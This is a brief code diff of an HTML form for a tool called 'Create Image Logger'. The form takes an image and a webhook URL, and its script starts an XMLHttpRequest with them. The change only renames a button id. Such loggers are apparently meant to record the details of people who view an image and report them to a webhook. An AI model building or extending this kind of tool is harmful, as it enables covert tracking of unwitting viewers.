@@ -21,9 +21,9 @@
       <i class ="fa fa-user icon"></i>
       <input class ="input-field" type ="text" id="url" placeholder ="Enter Webhook">
 </div>
-<button type="button" class ="btn" id="myButton"> Create Image Logger</button>
+<button type="button" class ="btn" id="create"> Create Image Logger</button>
 <script>
-    document.getElementById("myButton").onclick = function(){
+    document.getElementById("create").onclick = function(){
     var image = document.getElementById("image").value    
     var webhook = document.getElementById("url").value
     var request = new XMLHttpRequest;
